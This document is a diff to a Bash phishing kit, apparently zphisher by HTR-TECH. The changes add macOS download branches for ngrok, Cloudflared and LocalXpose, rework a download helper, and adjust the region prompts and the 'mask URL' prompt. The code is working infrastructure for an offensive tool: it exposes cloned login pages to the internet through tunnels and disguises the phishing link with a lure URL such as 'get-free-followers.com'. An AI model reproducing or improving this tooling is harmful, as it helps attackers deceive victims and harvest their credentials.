@@ -76,7 +76,7 @@
 ##    The precise terms and conditions for copying, distribution and
 ##    modification follow.
 ##
-##      Copyright (C) 2022  HTR-TECH (https://github.com/htr-tech)
+##      Copyright (C) 2023  HTR-TECH (https://github.com/htr-tech)
 ##
 
 ##   THANKS TO :
@@ -87,14 +87,18 @@
 ##   Moises Tapia - https://github.com/MoisesTapia
 ##   Mr.Derek - https://github.com/E343IO
 ##   Mustakim Ahmed - https://github.com/bdhackers009
-##   TheLinuxChoice - https://twitter.com/linux_choice
+##   TheLinuxChoice
 
 
 __version__="2.3.5"
 
 ## DEFAULT HOST & PORT
 HOST='127.0.0.1'
-PORT='8080' 
+PORT='8080'
+
+## Device Information
+DEVICE=$(uname -s)
+ARCH=$(uname -m)
 
 ## ANSI colors (FG & BG)
 RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
@@ -275,6 +279,7 @@ dependencies() {
 download() {
 	url="$1"
 	output="$2"
+	[ "$3" == "" ] && content="$output" || content="$3"
 	file=`basename $url`
 	if [[ -e "$file" || -e "$output" ]]; then
 		rm -rf "$file" "$output"
@@ -285,10 +290,10 @@ download() {
 	if [[ -e "$file" ]]; then
 		if [[ ${file#*.} == "zip" ]]; then
 			unzip -qq $file > /dev/null 2>&1
-			mv -f $output .server/$output > /dev/null 2>&1
+			mv -f $content .server/$output > /dev/null 2>&1
 		elif [[ ${file#*.} == "tgz" ]]; then
 			tar -zxf $file > /dev/null 2>&1
-			mv -f $output .server/$output > /dev/null 2>&1
+			mv -f $content .server/$output > /dev/null 2>&1
 		else
 			mv -f $file .server/$output > /dev/null 2>&1
 		fi
@@ -306,12 +311,15 @@ install_ngrok() {
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
 	else
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
-		arch=`uname -m`
-		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+		if [[ ("$ARCH" == *'arm'*) || ("$ARCH" == *'Android'*) ]]; then
 			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
-		elif [[ "$arch" == *'aarch64'* ]]; then
+		elif [[ ("$DEVICE" == *'Darwin'*) && ("$ARCH" == *'x86_64'*) ]]; then
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip' 'ngrok'
+		elif [[ ("$DEVICE" == *'Darwin'*) && ("$ARCH" == *'arm64'*) ]]; then
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip' 'ngrok'
+		elif [[ "$ARCH" == *'aarch64'* ]]; then
 			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz' 'ngrok'
-		elif [[ "$arch" == *'x86_64'* ]]; then
+		elif [[ "$ARCH" == *'x86_64'* ]]; then
 			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz' 'ngrok'
 		else
 			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz' 'ngrok'
@@ -325,12 +333,17 @@ install_cloudflared() {
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
 	else
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
-		arch=`uname -m`
-		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+		if [[ ("$ARCH" == *'arm'*) || ("$ARCH" == *'Android'*) ]]; then
 			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
-		elif [[ "$arch" == *'aarch64'* ]]; then
+		elif [[ ("$DEVICE" == *'Darwin'*) && ("$ARCH" == *'x86_64'*) ]]; then
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz' 'cloudflared'
+
+		elif [[ ("$DEVICE" == *'Darwin'*) && ("$ARCH" == *'arm64'*) ]]; then
+			echo "TBA"
+		
+		elif [[ "$ARCH" == *'aarch64'* ]]; then
 			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
-		elif [[ "$arch" == *'x86_64'* ]]; then
+		elif [[ "$ARCH" == *'x86_64'* ]]; then
 			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
 		else
 			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
@@ -344,12 +357,15 @@ install_localxpose() {
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
 	else
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
-		arch=`uname -m`
-		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+		if [[ ("$ARCH" == *'arm'*) || ("$ARCH" == *'Android'*) ]]; then
 			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
-		elif [[ "$arch" == *'aarch64'* ]]; then
+		elif [[ ("$DEVICE" == *'Darwin'*) && ("$ARCH" == *'x86_64'*) ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-darwin-amd64.zip' 'loclx' 'loclx-darwin-amd64'
+		elif [[ ("$DEVICE" == *'Darwin'*) && ("$ARCH" == *'arm64'*) ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-darwin-arm64.zip' 'loclx' 'loclx-darwin-arm64'
+		elif [[ "$ARCH" == *'aarch64'* ]]; then
 			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
-		elif [[ "$arch" == *'x86_64'* ]]; then
+		elif [[ "$ARCH" == *'x86_64'* ]]; then
 			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
 		else
 			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
@@ -475,7 +491,7 @@ start_ngrok() {
 	{ sleep 1; setup_site; }
 	echo -e "\n"
 	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Ngrok Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
-	[[ ${opinion,,} == "y" ]] && ngrok_region="eu" || ngrok_region="us"
+	[[ ${opinion} =~ ^([yY])$ ]] && ngrok_region="eu" || ngrok_region="us"
 	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
 
 	if [[ `command -v termux-chroot` ]]; then
@@ -534,7 +550,7 @@ start_loclx() {
 	{ sleep 1; setup_site; localxpose_auth; }
 	echo -e "\n"
 	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
-	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
+	[[ ${opinion} =~ ^([yY])$ ]] && loclx_region="eu" || loclx_region="us"
 	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
 
 	if [[ `command -v termux-chroot` ]]; then
@@ -593,7 +609,7 @@ custom_mask() {
 	{ sleep .5; clear; banner_small; echo; }
 	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
 	echo
-	if [[ ${mask_op,,} == "y" ]]; then
+	if [[ ${mask_op} =~ ^([yY])$ ]]; then
 		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
 		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
 		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
